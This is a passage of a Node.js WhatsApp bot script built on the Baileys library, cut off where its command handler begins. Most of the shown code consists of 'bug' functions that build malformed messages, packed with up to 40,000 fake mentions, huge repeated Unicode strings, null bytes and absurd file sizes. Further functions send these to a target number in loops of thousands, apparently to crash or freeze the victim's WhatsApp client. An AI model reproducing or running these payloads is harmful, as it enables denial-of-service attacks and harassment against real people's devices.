require('./setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = korps = async (korps, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? korps.user.id.split(":")[0] + "@s.whatsapp.net" || korps.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

const image = fs.readFileSync('./gallery/korps.jpg')
const kontributor = JSON.parse(fs.readFileSync('./lib/database/owner.json'));

const botNumber = await korps.decodeJid(korps.user.id);
const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await korps.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
    
const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);

// Media
const babi = fs.readFileSync('./gallery/Flash.jpeg')
const musicKorps = fs.readFileSync('./gallery/korupt.mp3')
// Time
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");

// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`𝙏𝙀𝙆𝙎 𝙏𝙃𝙀𝙁𝙇𝘼𝙎𝙃`));
console.log(
chalk.bgHex("#FF0000").black(
`  👤 Tanggal: ${new Date().toLocaleString()} \n` +
`  👤 Chat: ${m.body || m.mtype} \n` +
`  👤 Number: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#FF0000").black(
`   👤 Grup: ${groupName} \n` +
`   👤 GroupJid: ${m.chat}`
)
);
}
console.log();
}
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

async function loadmenugoz () {
var baralod = [
"ᖫ𝙂𝙊ᖭ",
"ᖫ𝙕𝙐ᖭ",
"ᖫ𝙅𝙄𝙄ᖭ", 
"𝙒𝘼𝙄𝙏 𝙏𝙊 𝙈𝙄𝙉𝙐𝙏𝙀.....",
"ᖫ𝐆𝐨𝐨𝐳 𝐔𝐉𝐈 𝐔𝐥𝐢𝐦𝐢𝐧𝐚𝐭𝐞ᖭ", 
]
let { key } = await korps.sendMessage(from, {text: 'GozzUji One'})

for (let i = 0; i < baralod.length; i++) {
await korps.sendMessage(from, {text: baralod[i], edit: key });
}
}

// Func delay new
async function protocolbug5(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "✺𝐋𝐮𝐜𝐮𝐮 𝐀𝐧𝐣𝐢𝐫𝐫✿" + "ោ៝".repeat(10000),
        title: "𝙂𝙤𝙯𝙯 𝙊𝙣𝙚",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/u/tamainfinity",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𝐆𝐨𝐳𝐳 𝐔𝐥𝐢𝐦𝐢𝐧𝐚𝐭𝐞",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝐆𝐨𝐳𝐳 𝐔𝐥𝐢𝐦𝐢𝐧𝐚𝐭𝐞"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await korps.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await korps.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function protocolbug7(target, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𝘎𝘰𝘻𝘶𝘫𝘪 𝘐𝘴 𝘏𝘦𝘳𝘦"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await korps.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await korps.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
async function delaysjh(target, mention) {

const TqXMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "DelayKorps" + "ꦾ".repeat(500),
        canonicalUrl: "DelayNative" + "ោ៝".repeat(500),
        description: "NativeVirusion" + "᭭".repeat(500),
        title: "You DEAD !",
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 99999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "I terror you",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "Https://t.me/malvinsock" + "ꦾ".repeat(500),
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "Https://" + "᭱".repeat(2000)
            },
            mentionedJid: Array.from({ length: 1000 }, () => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "🥶".repeat(1770),
        serviceType: 1
    }
};

const mentionjid = [
    "9999999999@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
];

const TheDj = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "LihX Sadness" + "ꦾ".repeat(10000),
    title: "By TqX" + "᭄".repeat(500),
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://n.uguu.se/UnDeath.jpg",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
};

const CrashMesagge = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "999999999999",
    seconds: 999999,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "𝐁̴𝐫̴𝐮̴𝐭̴𝐚̴𝐥̴ 𝐃̴𝐞̴𝐥̴𝐚̴𝐲̴ 𝐊̴𝐨̴𝐫̴𝐩̴𝐬̴",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: "DelayKorps",
            body: "\u0000".repeat(9117),
            mediaType: 1,
            renderLargerThumbnail: true,
            thumbnailUrl: null,
            sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
        businessMessageForwardInfo: {
            businessOwnerJid: target
        },
        quotedMessage: TqXMessage,
        isSampled: true,
        mentionedJid: mentionjid
    },
    forwardedNewsletterMessageInfo: {
        newsletterJid: "120363406229895095@newsletter",
        serverMessageId: 1,
        newsletterName: "ꦾ".repeat(100)
    },
    streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
        {
            embeddedContent: TheDj,
            embeddedAction: true
        }
    ]
};

const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
        message: { videoMessage: CrashMesagge }
    }
}, {});

await korps.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
        {
            tag: "meta",
            attrs: {},
            content: [
                {
                    tag: "mentioned_users",
                    attrs: {},
                    content: [
                        { tag: "to", attrs: { jid: target }, content: undefined }
                    ]
                }
            ]
        }
    ]
});

if (mention) {
    await korps.relayMessage(target, {
        groupStatusMentionMessage: {
            message: {
                protocolMessage: {
                    key: msg.key,
                    type: 25
                }
            }
        }
    }, {
        additionalNodes: [
            {
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }
        ]
    });
}
}

// Func fc
async function forclose(target) {
  await korps.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "⃟🩸🗿 🦠⃟",
          hasMediaAttachment: true
        },
        body: {
          text: "\nꦾ".repeat(155555)
        },
        nativeFlowMessage: {
          messageParamsJson: "{}",
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: "{}"
            }
          ]
        }
      }
    },
    {}
  );
}
async function antiFixForclose(korps, target) {
  try {
    const delay = (ms) => new Promise(res => setTimeout(res, ms));
    
    // 1. ContextInfo Mentions Spam + CallLog
    await korps.sendMessage(target, {
      callLogMessage: {
        callType: 'miss',
        duration: 99999,
        timestamp: Date.now()
      },
      contextInfo: {
        mentionedJid: Array(250).fill(target),
        forwardingScore: 9999,
        isForwarded: true
      }
    });
    await delay(2500);

    // 2. DocumentMessage Payload Kosong
    await korps.sendMessage(target, {
      documentMessage: {
        fileName: 'CRASH_PAYLOAD_V1.pdf',
        mimetype: 'application/pdf',
        fileLength: 999999999,
        url: 'https://file-examples.com/storage/fe3b10f1fdfd6d.pdf' // bisa diubah ke catbox
      },
      contextInfo: {}
    });
    await delay(2500);

    // 3. NativeFlowMessage Kosong + Mention Ganda
    await korps.sendMessage(target, {
      interactiveMessage: {
        nativeFlowMessage: {
          buttons: []
        }
      },
      contextInfo: {
        mentionedJid: Array(100).fill('0@s.whatsapp.net'),
        forwardingScore: 500,
        isForwarded: true
      }
    });
    await delay(2500);

    // 4. Poll Message Abuse
    await korps.sendMessage(target, {
      pollCreationMessage: {
        name: 'CRASH' + '꧁'.repeat(200),
        options: Array(50).fill({ optionName: '꧂'.repeat(50) }),
        selectableCount: 9
      }
    });
    await delay(2500);

    // 5. Order Message Kosong
    await korps.sendMessage(target, {
      orderMessage: {
        itemCount: 9999,
        status: 1,
        surface: 1,
        orderTitle: 'Crash Order' + '꧁'.repeat(100),
        message: ' ',
        thumbnail: Buffer.alloc(0)
      }
    });

    console.log(`[✓] Payload sent to ${target}`);
  } catch (err) {
    console.error('[x] Error during send:', err.message);
  }
}

// Function Bug - Ui
async function UiScorpio(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `妥𝙂𝙤𝙯𝙪𝙟𝙞𝘽𝙡𝙖𝙣𝙠𝙐𝙞楤.pdf`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "妥𝙂𝙤𝙯𝙪𝙟𝙞 𝘽𝙡𝙖𝙣𝙠𝙐𝙞楤" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "RIZXVELZ" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Gozz is here",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    korps.relayMessage(target, messagePayload, {}, { messageId: null });
}
async function BaccaratUi(korps, target) {
  await korps.relayMessage(
    target,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "9999999999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "𝙲𝚁𝙰𝚂𝙷𝙴𝚁.",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath:
                  "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
              title: "Gozuji Kill you panik deck玄",
              hasMediaAttachment: true,
            },
            body: {
              text:
                "ꦽ".repeat(50000) +
                "_*~@8~*_\n".repeat(50000) +
                "@8".repeat(50000),
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [
                { groupJid: "0@s.whatsapp.net", groupSubject: "anjay" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
    { messageId: null }
  );
}
//END FUNC BUG BRE

async function invisible1(target) {
for (let i = 0; i < 10000; i++) {
console.log(chalk.green(`send bug gozuji : ${i}/10000
target : ${target}`));
await TrashProtocol(target)
await TrashProtocol(target)
await TrashProtocol(target)
await protocolbug7(target, true)
await protocolbug7(target, true)
await protocolbug7(target, true)
await protocolbug5(target)
await protocolbug5(target)
await protocolbug5(target)
await VampBroadcast(target, mention = true)
await VampBroadcast(target, mention = true)
await VampBroadcast(target, mention = true)
await sleep(3000)
}
}

async function Fcgozz1(target) {
for (let i = 0; i < 1000; i++) {
console.log(chalk.green(`send bug gozuji : ${i}/1000
target : ${target}`));
await antiFixForclose(korps, target)
await antiFixForclose(korps, target)
await antiFixForclose(korps, target)
await antiFixForclose(korps, target)
await antiFixForclose(korps, target)
await antiFixForclose(korps, target)
await antiFixForclose(korps, target)
await UiScorpio(target)
await BaccaratUi(korps, target)
await BaccaratUi(korps, target)
await forclose(target)
await forclose(target)
await forclose(target)
}
}

const jem = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "1212121212",
      status: "INQUIRY",
      surface: "",
      message: `𒆜𝐊𝐨𝐫𝐩𝐬 𝐆𝐨𝐨𝐳𝐮𝐣𝐢!!!`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363378510313540@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const RC = fs.readFileSync('./gallery/korps.jpg')
const replyLFH = (teks) => {
    return korps.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𒆜𝐊𝐨𝐫𝐩𝐬 𝐆𝐨𝐨𝐳𝐮𝐣𝐢!!!`,
                body: `𝐃̳𝐞̳𝐯̳𝐞̳𝐥̳𝐨̳𝐩̳𝐞̳𝐫̳`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: "https://files.catbox.moe/ii5j8m.jpg",
                sourceUrl: `https://whatsapp.com/channel/0029VazqfJY8KMqqrvHFrv0Y`
            }
        }
    }, { quoted: jem });
}

const bugres = `╭━〔 𝙎̸̪̑̉𝙐̸̭̣͎̯͆̆𝘾̷̝̿̔̆𝘾̸̺̻̯͗̂̚͠𝙀̸̧̓̐̓̌𝙎̴͚̩̕ 𝙎̴͉̳̈͗̀𝙀̷̝̯̞̈́𝙉̷̣͐̈̏𝘿̷̢̛̺͙̯ 𝘽̵̞̱̃͌̓͜𝙐̵̮͚̀͊̌͊𝙂̵̻̯͓̭̓ 〕━⬣
┇
┇ 𝐓̲̲̅̅͟𝐘̲̲̅̅͟𝐏̲̲̅̅͟𝐄̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ ${command} ｠
┇
┇ 𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐑̲̲̅̅͟𝐆̲̲̅̅͟𝐄̲̲̅̅͟𝐓̲̲̅̅͟ : Maklu Targetnya🤓👆
┇
┇ 𝐒̲̲̅̅͟𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐓̲̲̅̅͟𝐔̲̲̅̅͟𝐒̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ ᴘʀᴏᴄᴇss ｠
┇
┇ 𝐍̲̲̅̅͟𝐎̲̲̅̅͟𝐓̲̲̅̅͟𝐄̲̲̅̅͟ : ｟ ᴊᴇᴅᴀ 𝟻ᴍᴇɴɪᴛ ｠
╰━━━━━━━━━━━━━━━━━⬣`

//END FUNC DLL
//END END

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `𝐆𝐨𝐳𝐮𝐣𝐢 𝐕𝟏𝟐.𝟎.𝟎`, 'vcard': `BEGIN:VCARD\nVERSION:8.5\nN:XL;𝐋𝐢𝐚𝐦,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://files.catbox.moe/ii5j8m.jpg' }}}}
const qlocmenu = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Verifikasi Penuh Dari Whatsapp`,jpegThumbnail: ""}}}
const reaction = async (from, emoji) => {
    korps.sendMessage(from, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };
// Command handler
switch (command) {

case "menu": {
